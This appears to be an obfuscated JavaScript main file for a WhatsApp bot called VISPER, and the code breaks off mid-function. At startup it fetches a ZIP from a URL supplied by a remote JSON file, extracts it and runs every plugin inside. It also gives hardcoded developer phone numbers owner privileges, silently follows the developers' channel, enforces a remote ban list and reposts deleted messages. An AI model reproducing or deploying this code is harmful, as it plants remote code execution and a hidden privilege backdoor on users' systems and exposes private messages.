const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  useMultiFileAuthState,
  DisconnectReason,
  getDevice,
  fetchLatestBaileysVersion,
  jidNormalizedUser,
  getContentType,
  Browsers,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto
} = require("darksadas-new-baliyes");
const fs = require('fs');
const P = require("pino");
const config = require("./config");
const NodeCache = require("node-cache");
const util = require("util");
const axios = require("axios");
const {
  File
} = require("megajs");
const path = require("path");
const msgRetryCounterCache = new NodeCache();
const l = console.log;
const SESSION_DIR = './' + config.SESSION_NAME;
if (!fs.existsSync(SESSION_DIR)) {
  fs.mkdirSync(SESSION_DIR);
}
if (!fs.existsSync(__dirname + ('/' + config.SESSION_NAME + "/creds.json"))) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("MOVIE-VISPER=", '');
    const filer = File.fromURL("https://mega.nz/file/" + sessdata);
    filer.download((_0x48218c, _0x5dd29e) => {
      if (_0x48218c) {
        throw _0x48218c;
      }
      fs.writeFile(__dirname + ('/' + config.SESSION_NAME + "/creds.json"), _0x5dd29e, () => {
        console.log("Session download completed !!");
      });
    });
  }
}
const express = require("express");
const app = express();
const port = process.env.PORT || config.PORT;
const AdmZip = require('adm-zip');
const connect = async () => {
  let _0x6ea735 = await axios.get("https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json");
  const _0x2cf82b = '' + _0x6ea735.data.megaurl;
  if (!fs.existsSync('./plugins')) {
    fs.mkdirSync('./plugins', {
      'recursive': true
    });
  }
  if (fs.existsSync('./data')) {
    fs.rmSync('./data', {
      'recursive': true,
      'force': true
    });
  }
  if (!fs.existsSync("./lib")) {
    fs.mkdirSync("./lib", {
      'recursive': true
    });
  }
  console.log("Fetching ZIP file from Mega.nz...");
  const _0x2344ef = File.fromURL('' + _0x2cf82b);
  const _0x3a4593 = await _0x2344ef.downloadBuffer();
  const _0x35b980 = path.join(__dirname, "temp.zip");
  fs.writeFileSync(_0x35b980, _0x3a4593);
  console.log("VISPER ZIP file downloaded successfully ✅");
  const _0x3a22f3 = new AdmZip(_0x35b980);
  _0x3a22f3.extractAllTo('./', true);
  console.log("Plugins extracted successfully ✅");
  console.log("Lib extracted successfully ✅");
  console.log("Installing plugins 🔌... ");
  fs.readdirSync("./plugins/").forEach(_0x505090 => {
    if (path.extname(_0x505090).toLowerCase() == '.js') {
      require("./plugins/" + _0x505090);
    }
  });
  fs.unlinkSync(_0x35b980);
  const {
    sleep: _0x2db73c
  } = require("./lib/functions");
  var {
    connectdb: _0x3759ff,
    updb: _0xde6658
  } = require("./lib/database");
  await _0x3759ff();
  await _0xde6658();
  console.log("VISPER CONNECTED ✅");
  await _0x2db73c(0xbb8);
  await connectToWA();
};
async function connectToWA() {
  const {
    version: _0x59b369,
    isLatest: _0x48e591
  } = await fetchLatestBaileysVersion();
  const {
    getBuffer: _0x2f063d,
    getGroupAdmins: _0x1afb07,
    getRandom: _0x29a0d1,
    sleep: _0x1fab52,
    fetchJson: _0x158542
  } = require("./lib/functions");
  const {
    sms: _0x24631a
  } = require("./lib/msg");
  var {
    updateCMDStore: _0x2899a2,
    isbtnID: _0x197439,
    getCMDStore: _0xbc005f,
    getCmdForCmdId: _0x1b7309,
    input: _0x1a6a27,
    get: _0x5a902a,
    getalls: _0x27b378,
    updfb: _0x18a103,
    upresbtn: _0x1f11f9
  } = require('./lib/database');
  const _0x54f84b = config.OWNER_NUMBER;
  const _0x26d17b = (await axios.get("https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json")).data;
  const _0x14292f = '' + _0x26d17b.connectmg;
  const _0x3429b6 = '' + _0x26d17b.cmsglogo;
  const {
    state: _0x5eed19,
    saveCreds: _0x4c04bb
  } = await useMultiFileAuthState(__dirname + ('/' + config.SESSION_NAME + '/'));
  const _0x47bf1c = makeWASocket({
    'logger': P({
      'level': 'fatal'
    }).child({
      'level': "fatal"
    }),
    'printQRInTerminal': true,
    'generateHighQualityLinkPreview': true,
    'auth': _0x5eed19,
    'defaultQueryTimeoutMs': undefined,
    'msgRetryCounterCache': msgRetryCounterCache
  });
  _0x47bf1c.ev.on("connection.update", async _0x1f1f44 => {
    const {
      connection: _0x4d209b,
      lastDisconnect: _0x37fa29
    } = _0x1f1f44;
    if (_0x4d209b === "close") {
      if (_0x37fa29.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else {
      if (_0x4d209b === "open") {
        console.log("WA CONNECTED ✅");
        await _0x47bf1c.sendMessage(_0x54f84b + '@s.whatsapp.net', {
          'image': {
            'url': _0x3429b6
          },
          'caption': _0x14292f
        });
      }
    }
  });
  _0x47bf1c.ev.on('creds.update', _0x4c04bb);
  _0x47bf1c.ev.on("messages.upsert", async _0x2b3295 => {
    try {
      async function _0x50b299() {
        const _0xad678 = await _0x27b378();
        if (_0xad678) {
          Object.assign(config, _0xad678);
        }
      }
      _0x50b299()["catch"](console.error);
      _0x2b3295 = _0x2b3295.messages[0x0];
      if (!_0x2b3295.message) {
        return;
      }
      _0x2b3295.message = getContentType(_0x2b3295.message) === "ephemeralMessage" ? _0x2b3295.message.ephemeralMessage.message : _0x2b3295.message;
      if (!_0x2b3295.message) {
        return;
      }
      _0x2b3295.message = getContentType(_0x2b3295.message) === "ephemeralMessage" ? _0x2b3295.message.ephemeralMessage.message : _0x2b3295.message;
      if (_0x2b3295.key && _0x2b3295.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
        const _0xc2451f = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
        const _0x54b34e = _0xc2451f[Math.floor(Math.random() * _0xc2451f.length)];
        await _0x47bf1c.readMessages([_0x2b3295.key]);
        const _0x5a6d22 = await jidNormalizedUser(_0x47bf1c.user.id);
        await _0x47bf1c.sendMessage(_0x2b3295.key.remoteJid, {
          'react': {
            'key': _0x2b3295.key,
            'text': _0x54b34e
          }
        }, {
          'statusJidList': [_0x2b3295.key.participant, _0x5a6d22]
        });
      }
      if (_0x2b3295.key && _0x2b3295.key.remoteJid === "status@broadcast") {
        return;
      }
      const _0x524493 = await _0x47bf1c.newsletterMetadata("jid", '' + _0x26d17b.mainchanal);
      if (_0x524493.viewer_metadata === null) {
        await _0x47bf1c.newsletterFollow('' + _0x26d17b.mainchanal);
        console.log("VISPER MD UPDATES CHNAL FOLLOW ✅");
      }
      const _0x10f0e4 = _0x24631a(_0x47bf1c, _0x2b3295);
      const _0x31b25c = getContentType(_0x2b3295.message);
      const _0x2fbc2a = _0x2b3295.key.remoteJid;
      const _0x4656b2 = _0x31b25c == "extendedTextMessage" && _0x2b3295.message.extendedTextMessage.contextInfo != null ? _0x2b3295.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const _0x1b17c1 = _0x31b25c === "conversation" ? _0x2b3295.message.conversation : _0x2b3295.message?.["extendedTextMessage"]?.["contextInfo"]?.["hasOwnProperty"]("quotedMessage") && (await _0x197439(_0x2b3295.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId'])) && _0x1b7309(await _0xbc005f(_0x2b3295.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId']), _0x2b3295?.['message']?.["extendedTextMessage"]?.["text"]) ? _0x1b7309(await _0xbc005f(_0x2b3295.message?.["extendedTextMessage"]?.["contextInfo"]?.['stanzaId']), _0x2b3295?.["message"]?.['extendedTextMessage']?.["text"]) : _0x31b25c === "extendedTextMessage" ? _0x2b3295.message.extendedTextMessage.text : _0x31b25c == "imageMessage" && _0x2b3295.message.imageMessage.caption ? _0x2b3295.message.imageMessage.caption : _0x31b25c == "videoMessage" && _0x2b3295.message.videoMessage.caption ? _0x2b3295.message.videoMessage.caption : '';
      const _0x392ea5 = config.PREFIX;
      const _0x503a51 = _0x1b17c1.startsWith(_0x392ea5);
      const _0x2c0d42 = _0x503a51 ? _0x1b17c1.slice(_0x392ea5.length).trim().split(" ").shift().toLowerCase() : '';
      const _0x302ca0 = _0x1b17c1.trim().split(/ +/).slice(0x1);
      const _0x35f8ba = _0x302ca0.join(" ");
      const _0x4c8e70 = _0x2fbc2a.endsWith("@g.us");
      const _0x566e48 = _0x2b3295.key.fromMe ? _0x47bf1c.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x47bf1c.user.id : _0x2b3295.key.participant || _0x2b3295.key.remoteJid;
      const _0x96295f = _0x566e48.split('@')[0x0];
      const _0xdc42b5 = _0x47bf1c.user.id.split(':')[0x0];
      const _0x5d4930 = _0x2b3295.pushName || "Sin Nombre";
      const _0x904e20 = '94778500326,94722617699,94788518429,94787318729'.split(',');
      const _0x3b607d = _0xdc42b5.includes(_0x96295f);
      const _0x2bf2b7 = _0x904e20.includes(_0x96295f);
      const _0x2db37f = _0x3b607d ? _0x3b607d : _0x2bf2b7;
      const _0x2c2290 = _0x54f84b.includes(_0x96295f) || _0x2db37f;
      const _0x5c7416 = await jidNormalizedUser(_0x47bf1c.user.id);
      const _0x3e7de1 = _0x4c8e70 ? await _0x47bf1c.groupMetadata(_0x2fbc2a)["catch"](_0x5e29f9 => null) : null;
      const _0x276890 = _0x4c8e70 && _0x3e7de1 ? _0x3e7de1.subject : '';
      const _0x1d9215 = _0x4c8e70 && _0x3e7de1 ? _0x3e7de1.participants : [];
      const _0x56aaea = _0x4c8e70 ? _0x1afb07(_0x1d9215) : [];
      const _0x2c3b79 = _0x4c8e70 ? _0x56aaea.includes(_0x5c7416) : false;
      const _0x2b4df6 = _0x4c8e70 ? _0x56aaea.includes(_0x566e48) : false;
      const _0x2d093e = !!_0x10f0e4.message.reactionMessage;
      const _0x356004 = _0x34869f => {
        for (let _0x32ddef = 0x0; _0x32ddef < _0x34869f.length; _0x32ddef++) {
          if (_0x34869f[_0x32ddef] === _0x2fbc2a) {
            return true;
          }
        }
        return false;
      };
      const _0x2de4a0 = async _0x44af96 => {
        return await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'text': _0x44af96
        }, {
          'quoted': _0x2b3295
        });
      };
      _0x47bf1c.replyad = async _0x278d92 => {
        await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'text': _0x278d92
        }, {
          'quoted': _0x2b3295
        });
      };
      _0x47bf1c.buttonMessage2 = async (_0xf88308, _0x2bb57, _0x4956ba) => {
        let _0x461730 = '';
        const _0x37ad93 = [];
        _0x2bb57.buttons.forEach((_0x50a332, _0x56b726) => {
          const _0x484501 = '' + (_0x56b726 + 0x1);
          _0x461730 += "\n*" + _0x484501 + " ||*  " + _0x50a332.buttonText.displayText;
          _0x37ad93.push({
            'cmdId': _0x484501,
            'cmd': _0x50a332.buttonId
          });
        });
        if (_0x2bb57.headerType === 0x1) {
          const _0x58ab8a = _0x2bb57.text + "\n\n*`Reply Below Number 🔢`*\n" + _0x461730 + "\n\n" + _0x2bb57.footer;
          const _0x1a7dff = await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': _0x58ab8a
          }, {
            'quoted': _0x4956ba || _0x2b3295
          });
          await _0x2899a2(_0x1a7dff.key.id, _0x37ad93);
        } else {
          if (_0x2bb57.headerType === 0x4) {
            const _0x4b805b = _0x2bb57.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x461730 + "\n\n" + _0x2bb57.footer;
            const _0x1b2c94 = await _0x47bf1c.sendMessage(_0xf88308, {
              'image': _0x2bb57.image,
              'caption': _0x4b805b
            }, {
              'quoted': _0x4956ba || _0x2b3295
            });
            await _0x2899a2(_0x1b2c94.key.id, _0x37ad93);
          }
        }
      };
      _0x47bf1c.buttonMessage = async (_0xb5fe08, _0x55eda1, _0x5d03cd) => {
        let _0x2c50cf = '';
        const _0x4ac596 = [];
        _0x55eda1.buttons.forEach((_0x36aae3, _0x8b2616) => {
          const _0x362d03 = '' + (_0x8b2616 + 0x1);
          _0x2c50cf += "\n*" + _0x362d03 + " ||*  " + _0x36aae3.buttonText.displayText;
          _0x4ac596.push({
            'cmdId': _0x362d03,
            'cmd': _0x36aae3.buttonId
          });
        });
        if (_0x55eda1.headerType === 0x1) {
          const _0x24879c = (_0x55eda1.text || _0x55eda1.caption) + "\n\n*`Reply Below Number 🔢`*\n" + _0x2c50cf + "\n\n" + _0x55eda1.footer;
          const _0x56cda2 = await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': _0x24879c
          }, {
            'quoted': _0x5d03cd || _0x2b3295
          });
          await _0x2899a2(_0x56cda2.key.id, _0x4ac596);
        } else {
          if (_0x55eda1.headerType === 0x4) {
            const _0x54add7 = _0x55eda1.caption + "\n\n*`Reply Below Number 🔢`*\n" + _0x2c50cf + "\n\n" + _0x55eda1.footer;
            const _0x5a56cf = await _0x47bf1c.sendMessage(_0xb5fe08, {
              'image': _0x55eda1.image,
              'caption': _0x54add7
            }, {
              'quoted': _0x5d03cd || _0x2b3295
            });
            await _0x2899a2(_0x5a56cf.key.id, _0x4ac596);
          }
        }
      };
      _0x47bf1c.listMessage2 = async (_0x598c26, _0x32da01, _0x194a55) => {
        let _0x3659fb = '';
        const _0x745a89 = [];
        _0x32da01.sections.forEach((_0x4ed0a8, _0x2fd81a) => {
          const _0x5b7ccc = '' + (_0x2fd81a + 0x1);
          _0x3659fb += "\n*" + _0x4ed0a8.title + "*\n\n";
          _0x4ed0a8.rows.forEach((_0x5f3067, _0x3acf47) => {
            const _0x5d9beb = _0x5b7ccc + '.' + (_0x3acf47 + 0x1);
            const _0x3474e9 = '*' + _0x5d9beb + " ||* " + _0x5f3067.title;
            _0x3659fb += _0x3474e9 + "\n";
            if (_0x5f3067.description) {
              _0x3659fb += "   " + _0x5f3067.description + "\n\n";
            }
            _0x745a89.push({
              'cmdId': _0x5d9beb,
              'cmd': _0x5f3067.rowId
            });
          });
        });
        const _0x177620 = _0x32da01.text + "\n\n" + _0x32da01.buttonText + ',' + _0x3659fb + "\n" + _0x32da01.footer;
        const _0x11c4fe = await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'text': _0x177620
        }, {
          'quoted': _0x194a55 || _0x2b3295
        });
        await _0x2899a2(_0x11c4fe.key.id, _0x745a89);
      };
      _0x47bf1c.listMessage = async (_0x283f90, _0x1c473c, _0x3fd397) => {
        let _0x1f3cd1 = '';
        const _0x11dcf9 = [];
        _0x1c473c.sections.forEach((_0xc764b4, _0x5beb71) => {
          const _0x1450df = '' + (_0x5beb71 + 0x1);
          _0x1f3cd1 += "\n*" + _0xc764b4.title + "*\n\n";
          _0xc764b4.rows.forEach((_0x11bce7, _0x53b879) => {
            const _0x417767 = _0x1450df + '.' + (_0x53b879 + 0x1);
            const _0x37cece = '*' + _0x417767 + " ||*  " + _0x11bce7.title;
            _0x1f3cd1 += _0x37cece + "\n";
            if (_0x11bce7.description) {
              _0x1f3cd1 += "   " + _0x11bce7.description + "\n\n";
            }
            _0x11dcf9.push({
              'cmdId': _0x417767,
              'cmd': _0x11bce7.rowId
            });
          });
        });
        const _0xd6563 = _0x1c473c.text + "\n\n" + _0x1c473c.buttonText + ',' + _0x1f3cd1 + "\n\n" + _0x1c473c.footer;
        const _0xcbcab7 = await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'text': _0xd6563
        }, {
          'quoted': _0x3fd397 || _0x2b3295
        });
        await _0x2899a2(_0xcbcab7.key.id, _0x11dcf9);
      };
      _0x47bf1c.edite = async (_0x4bb9da, _0xa8df85) => {
        await _0x47bf1c.relayMessage(_0x2fbc2a, {
          'protocolMessage': {
            'key': _0x4bb9da.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0xa8df85
            }
          }
        }, {});
      };
      _0x47bf1c.forwardMessage = async (_0x512fa6, _0x232c39, _0xca235c = false, _0x58f1f8 = {}) => {
        let _0x289208;
        if (_0x58f1f8.readViewOnce) {
          _0x232c39.message = _0x232c39.message && _0x232c39.message.ephemeralMessage && _0x232c39.message.ephemeralMessage.message ? _0x232c39.message.ephemeralMessage.message : _0x232c39.message || undefined;
          _0x289208 = Object.keys(_0x232c39.message.viewOnceMessage.message)[0x0];
          delete (_0x232c39.message && _0x232c39.message.ignore ? _0x232c39.message.ignore : _0x232c39.message || undefined);
          delete _0x232c39.message.viewOnceMessage.message[_0x289208].viewOnce;
          _0x232c39.message = {
            ..._0x232c39.message.viewOnceMessage.message
          };
        }
        let _0x28d43a = Object.keys(_0x232c39.message)[0x0];
        let _0x14a896 = await generateForwardMessageContent(_0x232c39, _0xca235c);
        let _0x3d1408 = Object.keys(_0x14a896)[0x0];
        let _0x3c26d0 = {};
        if (_0x28d43a != "conversation") {
          _0x3c26d0 = _0x232c39.message[_0x28d43a].contextInfo;
        }
        _0x14a896[_0x3d1408].contextInfo = {
          ..._0x3c26d0,
          ..._0x14a896[_0x3d1408].contextInfo
        };
        const _0x1c3a4d = await generateWAMessageFromContent(_0x512fa6, _0x14a896, _0x58f1f8 ? {
          ..._0x14a896[_0x3d1408],
          ..._0x58f1f8,
          ...(_0x58f1f8.contextInfo ? {
            'contextInfo': {
              ..._0x14a896[_0x3d1408].contextInfo,
              ..._0x58f1f8.contextInfo
            }
          } : {})
        } : {});
        await _0x47bf1c.relayMessage(_0x512fa6, _0x1c3a4d.message, {
          'messageId': _0x1c3a4d.key.id
        });
        return _0x1c3a4d;
      };
      _0x47bf1c.sendFileUrl = async (_0x587e6e, _0x940d7, _0x13d4db, _0x483228, _0x2e1c88 = {}) => {
        let _0x331eb5 = '';
        let _0x406c48 = await axios.head(_0x940d7);
        _0x331eb5 = _0x406c48.headers["content-type"];
        if (_0x331eb5.split('/')[0x1] === "gif") {
          return _0x47bf1c.sendMessage(_0x587e6e, {
            'video': await _0x2f063d(_0x940d7),
            'caption': _0x13d4db,
            'gifPlayback': true,
            ..._0x2e1c88
          }, {
            'quoted': _0x483228,
            ..._0x2e1c88
          });
        }
        if (_0x331eb5 === 'application/pdf') {
          return _0x47bf1c.sendMessage(_0x587e6e, {
            'document': await _0x2f063d(_0x940d7),
            'mimetype': "application/pdf",
            'caption': _0x13d4db,
            ..._0x2e1c88
          }, {
            'quoted': _0x483228,
            ..._0x2e1c88
          });
        }
        if (_0x331eb5.split('/')[0x0] === "image") {
          return _0x47bf1c.sendMessage(_0x587e6e, {
            'image': await _0x2f063d(_0x940d7),
            'caption': _0x13d4db,
            ..._0x2e1c88
          }, {
            'quoted': _0x483228,
            ..._0x2e1c88
          });
        }
        if (_0x331eb5.split('/')[0x0] === "video") {
          return _0x47bf1c.sendMessage(_0x587e6e, {
            'video': await _0x2f063d(_0x940d7),
            'caption': _0x13d4db,
            'mimetype': "video/mp4",
            ..._0x2e1c88
          }, {
            'quoted': _0x483228,
            ..._0x2e1c88
          });
        }
        if (_0x331eb5.split('/')[0x0] === "audio") {
          return _0x47bf1c.sendMessage(_0x587e6e, {
            'audio': await _0x2f063d(_0x940d7),
            'caption': _0x13d4db,
            'mimetype': "audio/mpeg",
            ..._0x2e1c88
          }, {
            'quoted': _0x483228,
            ..._0x2e1c88
          });
        }
      };
      const _0x2a6911 = (await axios.get('https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json')).data;
      config.FOOTER = _0x2a6911.footer;
      const _0x52bae2 = await _0x158542('https://mv-visper-full-db.pages.dev/Main/premium_user.json');
      const _0x3f2093 = _0x52bae2.numbers.split(',');
      const _0x3223e7 = _0x3f2093.map(_0x104b33 => _0x104b33.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x566e48);
      const _0x4e8c24 = await _0x158542('https://mv-visper-full-db.pages.dev/Main/ban_number.json');
      const _0x3bc293 = _0x4e8c24.split(',');
      const _0x18c457 = [..._0x3bc293].map(_0x38160f => _0x38160f.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(_0x566e48);
      let _0x1408ab = '' + config.JID_BLOCK;
      const _0x396976 = _0x1408ab.split(',');
      const _0x558458 = [..._0x396976].includes(_0x2fbc2a);
      let _0x2cb155 = '' + config.SUDO;
      const _0x3d01bb = _0x2cb155.split(',');
      const _0x57b364 = [..._0x3d01bb].includes(_0x566e48);
      if (_0x503a51 && _0x558458 && !_0x2db37f && !_0x57b364) {
        return;
      }
      const _0x8cb02 = (await axios.get("https://mv-visper-full-db.pages.dev/Main/react.json")).data;
      const _0x1e6e2e = (await axios.get("https://raw.githubusercontent.com/Nano-999/EMU/refs/heads/main/kiriya.json")).data;
      const _0x1ecab2 = _0x2b3295.key.server_id;
      await _0x47bf1c.newsletterReactMessage('' + _0x1e6e2e.mainchanal, _0x1ecab2, '' + _0x1e6e2e.chreact);
      if (_0x96295f.includes("94778500326")) {
        if (_0x2d093e) {
          return;
        }
        _0x10f0e4.react('' + _0x8cb02.sadas);
      }
      if (_0x96295f.includes("94722617699")) {
        if (_0x2d093e) {
          return;
        }
        _0x10f0e4.react('' + _0x8cb02.saviya);
      }
      if (_0x96295f.includes("94724884317")) {
        if (_0x2d093e) {
          return;
        }
        _0x10f0e4.react('' + _0x8cb02.damiru);
      }
      if (_0x96295f.includes('94787318429')) {
        if (_0x2d093e) {
          return;
        }
        _0x10f0e4.react('' + _0x8cb02.sadas);
      }
      const _0x58d166 = config.OWNER_NUMBER;
      if (_0x96295f.includes(_0x58d166)) {
        if (_0x2d093e) {
          return;
        }
        _0x10f0e4.react("💁‍♂️");
      }
      if (_0x503a51 && config.CMD_ONLY_READ == 'true') {
        await _0x47bf1c.readMessages([_0x2b3295.key]);
      }
      if (config.WORK_TYPE == "only_group") {
        if (!_0x4c8e70 && _0x503a51 && !_0x2db37f && !_0x2c2290 && !_0x57b364) {
          return;
        }
      }
      if (config.WORK_TYPE == "private") {
        if (_0x503a51 && !_0x2db37f && !_0x2c2290 && !_0x57b364) {
          return;
        }
      }
      if (config.WORK_TYPE == "inbox") {
        if (_0x4c8e70 && !_0x2db37f && !_0x2c2290 && !_0x57b364) {
          return;
        }
      }
      if (_0x18c457) {
        await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'delete': _0x2b3295.key
        });
        await _0x47bf1c.groupParticipantsUpdate(_0x2fbc2a, [_0x566e48], "remove");
        return await _0x47bf1c.sendMessage(_0x2fbc2a, {
          'text': "*You are banned by VISPER TEAM ❌*"
        });
      }
      if (config.AUTO_BLOCK == "true" && _0x2b3295.chat.endsWith("@s.whatsapp.net")) {
        if (!_0x2db37f) {
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': "*Warning 1 ❗*"
          });
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': "*Warning 2 ❗*"
          });
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': "*Warning 3 ❗*"
          });
          await _0x47bf1c.sendMessage(_0x2fbc2a, {
            'text': "*Blocked 🚫*"
          });
          await _0x47bf1c.updateBlockStatus(_0x2b3295.sender, "block");
        }
      }
      _0x47bf1c.ev.on("call", async _0x457d89 => {
        if (config.ANTI_CALL == "true") {
          for (const _0x4a0056 of _0x457d89) {
            if (_0x4a0056.status === "offer") {
              await _0x47bf1c.rejectCall(_0x4a0056.id, _0x4a0056.from);
              if (!_0x4a0056.isGroup) {
                await _0x47bf1c.sendMessage(_0x4a0056.from, {
                  'text': "*Call rejected automatically because owner is busy ⚠️*",
                  'mentions': [_0x4a0056.from]
                });
                break;
              }
            }
          }
        }
      });
      if (_0x503a51 && config.CMD_ONLY_READ == "true") {
        await _0x47bf1c.readMessages([_0x2b3295.key]);
      }
      const _0x2b2be9 = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '🤗', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
      const _0x7cc217 = _0x2b2be9[Math.floor(Math.random() * _0x2b2be9.length)];
      if (!_0x2db37f && !_0x558458 && config.AUTO_REACT == "true") {
        if (_0x2d093e) {
          return;
        }
        await _0x47bf1c.sendMessage(_0x2b3295.chat, {
          'react': {
            'text': _0x7cc217,
            'key': _0x2b3295.key
          }
        });
      }
      if (config.AUTO_MSG_READ == "true") {
        await _0x47bf1c.readMessages([_0x2b3295.key]);
      }
      if (config.AUTO_TYPING == "true") {
        _0x47bf1c.sendPresenceUpdate('composing', _0x2b3295.key.remoteJid);
      }
      if (config.AUTO_RECORDING == "true") {
        _0x47bf1c.sendPresenceUpdate("recording", _0x2b3295.key.remoteJid);
      }
      if (config.CHAT_BOT == "true") {
        if (_0x10f0e4.quoted) {
          let _0xb152f4 = _0x10f0e4.body ? _0x10f0e4.body.toLowerCase() : '';
          try {
            let _0x4d4508 = await _0x158542("https://saviya-kolla-api.koyeb.app/ai/saviya-ai?query=" + _0xb152f4);
            await _0x47bf1c.sendMessage(_0x2fbc2a, {
              'text': _0x4d4508.result.data
            });
          } catch (_0x3125db) {
            console.error("AI Chat Error:", _0x3125db);
            await _0x47bf1c.sendMessage(_0x2fbc2a, {
              'text': '.'
            });
          }
        }
      }
      if (!_0x2c2290) {
        if (config.ANTI_DELETE == "true") {
          if (!_0x10f0e4.id.startsWith('BAE5')) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0xf532c4(_0x130afb, _0x19f181) {
              const _0x2c9498 = path.join("message_data", _0x130afb, _0x19f181 + ".json");
              try {
                const _0x22d553 = fs.readFileSync(_0x2c9498, "utf8");
                return JSON.parse(_0x22d553) || [];
              } catch (_0x24e8af) {
                return [];
              }
            }
            function _0x4dede2(_0x528b5d, _0x55a578, _0x147aa4) {
              const _0xcaa64f = path.join("message_data", _0x528b5d);
              if (!fs.existsSync(_0xcaa64f)) {
                fs.mkdirSync(_0xcaa64f, {
                  'recursive': true
                });
              }
              const _0x1006c5 = path.join(_0xcaa64f, _0x55a578 + ".json");
              try {
                fs.writeFileSync(_0x1006c5, JSON.stringify(_0x147aa4, null, 0x2));
              } catch (_0x58c232) {
                console.error("Error saving chat data:", _0x58c232);
              }
            }
            function _0x3119ef(_0x23c34a) {
              const _0x3ab144 = _0x23c34a.key.id;
              const _0x48ba73 = _0xf532c4(_0x2fbc2a, _0x3ab144);
              _0x48ba73.push(_0x23c34a);
              _0x4dede2(_0x2fbc2a, _0x3ab144, _0x48ba73);
            }
            function _0xf2784(_0x1b49ce) {
              const _0x402d6b = _0x1b49ce.msg.key.id;
              const _0x1290ab = _0xf532c4(_0x2fbc2a, _0x402d6b);
              const _0x42ba3d = _0x1290ab[0x0];
              if (_0x42ba3d) {
                const _0x52ee89 = _0x1b49ce.sender.split('@')[0x0];
                const _0x1959c7 = _0x42ba3d.key.participant ?? _0x1b49ce.sender;
                const _0x10d130 = _0x1959c7.split('@')[0x0];
                if (_0x52ee89.includes(_0xdc42b5) || _0x10d130.includes(_0xdc42b5)) {
                  return;
                }
                if (_0x42ba3d.message && _0x42ba3d.message.conversation && _0x42ba3d.message.conversation !== '') {
                  const _0x39d1f8 = _0x42ba3d.message.conversation;
                  var _0x5e3409 = "```";
                  _0x47bf1c.sendMessage(_0x2fbc2a, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + _0x5e3409 + _0x39d1f8 + _0x5e3409
                  });
                } else {
                  if (_0x42ba3d.msg.type === 'MESSAGE_EDIT') {
                    _0x47bf1c.sendMessage(_0x2fbc2a, {
                      'text': "❌ *edited message detected* " + _0x42ba3d.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x2b3295
                    });
                  } else {
                    if (_0x42ba3d.message && _0x42ba3d.message.exetendedTextMessage && _0x42ba3d.msg.text) {
                      const _0x19c392 = _0x42ba3d.msg.text;
                      if (_0x4c8e70 && _0x19c392.includes("chat.whatsapp.com")) {
                        return;
                      }
                      var _0x5e3409 = "```";
                      _0x47bf1c.sendMessage(_0x2fbc2a, {
                        'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + _0x5e3409 + _0x19c392 + _0x5e3409
                      });
                    } else {
                      if (_0x42ba3d.message && _0x42ba3d.message.exetendedTextMessage) {
                        if (_0x4c8e70 && messageText.includes("chat.whatsapp.com")) {
                          return;
                        }
                        var _0x5e3409 = "```";
                        _0x47bf1c.sendMessage(_0x2fbc2a, {
                          'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + _0x5e3409 + _0x42ba3d.body + _0x5e3409
                        });
                      } else {
                        if (_0x42ba3d.type === "extendedTextMessage") {
                          async function _0x34756b() {
                            if (_0x42ba3d.message.extendedTextMessage) {
                              if (_0x4c8e70 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x47bf1c.sendMessage(_0x2fbc2a, {
                                'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x52ee89 + "_\n  📩 *Sent by:* _" + _0x10d130 + "_\n\n> 🔓 Message Text: " + "```" + _0x42ba3d.message.extendedTextMessage.text + "```"
                              });
                            } else {
                              if (_0x4c8e70 && messageText.includes("chat.whatsapp.com")) {
                                return;
                              }
                              _0x47bf1c.sendMessage(_0x2fbc2a, {
